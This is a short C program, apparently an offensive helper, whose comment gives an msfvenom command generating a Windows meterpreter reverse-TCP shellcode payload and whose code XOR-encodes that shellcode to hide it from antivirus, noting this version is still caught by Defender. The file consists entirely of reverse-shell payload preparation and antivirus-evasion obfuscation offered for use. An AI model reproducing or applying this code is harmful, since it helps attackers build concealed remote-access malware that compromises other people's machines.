#include <stdio.h>

// msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ip LPORT=443 -f c -o shellcode.bin
// this implementation of xor is catchable by defender AV
unsigned char tryme[] = SHELLCODEGOESHERE;

int main()
{
	char key = 'MK';
	int i = 0;
	for (i; i < sizeof(tryme); i++)
	{
		printf("\\x%02x", tryme[i] ^ key);
	}
}
